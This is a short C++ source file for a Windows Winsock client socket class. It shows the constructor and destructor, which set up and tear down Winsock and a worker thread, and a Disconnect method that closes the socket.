#include "stdafx.h"
#include "ClientSocket.h"

CClientSocket::CClientSocket()
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	m_hEvent = CreateEvent(NULL, true, false, NULL);
	m_bIsRunning = FALSE;
	m_socket = INVALID_SOCKET;
	// Packet Flag;
	BYTE bPacketFlag[] = {'p', 'r', 'i', 'n'};
	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
}
CClientSocket::~CClientSocket()
{
	m_bIsRunning = false;
	WaitForSingleObject(m_hWorkerThread, INFINITE);
	if (m_socket != INVALID_SOCKET)
		Disconnect();
	CloseHandle(m_hWorkerThread);
	CloseHandle(m_hEvent);
	WSACleanup();
}
BOOL CClientSocket::Disconnect()
{
	LINGER lingerStruct;
	lingerStruct.l_onoff = 1;
	lingerStruct.l_linger = 0;
	setsockopt(m_socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct) );
	CancelIo((HANDLE) m_socket);
	InterlockedExchange((LPLONG)&m_bIsRunning, false);
	closesocket(m_socket);
	SetEvent(m_hEvent);	
	m_socket = INVALID_SOCKET;
}